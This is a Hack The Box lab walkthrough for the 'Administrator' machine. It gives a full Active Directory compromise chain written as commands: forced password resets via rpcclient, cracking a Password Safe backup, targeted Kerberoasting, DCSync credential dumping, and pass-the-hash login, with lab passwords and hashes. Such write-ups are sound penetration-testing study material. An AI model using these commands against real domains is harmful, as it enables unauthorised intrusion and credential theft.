# Administrator: Machine Notes

## Initial Credentials
- User: `Olivia`
- Password: `ichliebedich`
- Target IP: `10.129.47.97`
- Domain: `administrator.htb`

## Recon

### Nmap
- Ports: 21 (FTP), 53 (DNS), 88 (Kerberos), 135/139/445 (RPC/SMB), 389/3268 (LDAP), 5985 (WinRM)

## Path to Compromise

### 1. Active Directory Chain (Olivia -> Michael -> Benjamin)
- BloodHound shows `Olivia` has **GenericAll** on `michael`.
- Reset `michael` password:
```bash
rpcclient -U "administrator.htb/olivia%ichliebedich" 10.129.47.97
setuserinfo2 michael 23 'NewPassword123!'
```
- `michael` has **ForceChangePassword** on `benjamin`.
- Reset `benjamin` password:
```bash
rpcclient -U "administrator.htb/michael%NewPassword123!" 10.129.47.97
setuserinfo2 benjamin 23 'NewPassword123!'
```

### 2. Password Safe Cracking (Benjamin -> Emily)
- `benjamin` has access to FTP.
- Downloaded `Backup.psafe3`.
- Cracking:
```bash
pwsafe2john Backup.psafe3 > phash.txt
john --format=pwsafe phash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Result: tekieromucho
```
- Extracted Credeantials:
  - Alexander: `UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
  - Emily: `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
  - Emma: `WwANQWnmJnGV07WQN8bMS7FMAbjNur`

### 3. Targeted Kerberoasting (Emily -> Ethan)
- `emily` has **GenericWrite** on `ethan`.
- Add a fake SPN to `ethan`'s account to make him Kerberoastable:
```powershell
# Using PowerShell (if foothold obtained) or rpcclient/net
Set-ADUser ethan -ServicePrincipalNames @{Add='MSSQLSvc/server.admin.htb'}
```
- Request TGS:
```bash
impacket-GetUserSPNs -dc-ip 10.129.47.97 administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -request-user ethan
```
- Crack Hash:
```bash
hashcat -m 13100 ethan_tgs.hash /usr/share/wordlists/rockyou.txt
# Result: limpbizkit
```

### 4. Domain Compromise (Ethan -> Administrator)
- `ethan` has DCSync privileges.
- Dump NTDS:
```bash
secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'10.129.47.97'
```
- **Administrator Hash**: `3dc553ce4b9fd20bd016e098d2d2fd2e`
- Pass-the-Hash login:
```bash
evil-winrm -i administrator.htb -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```
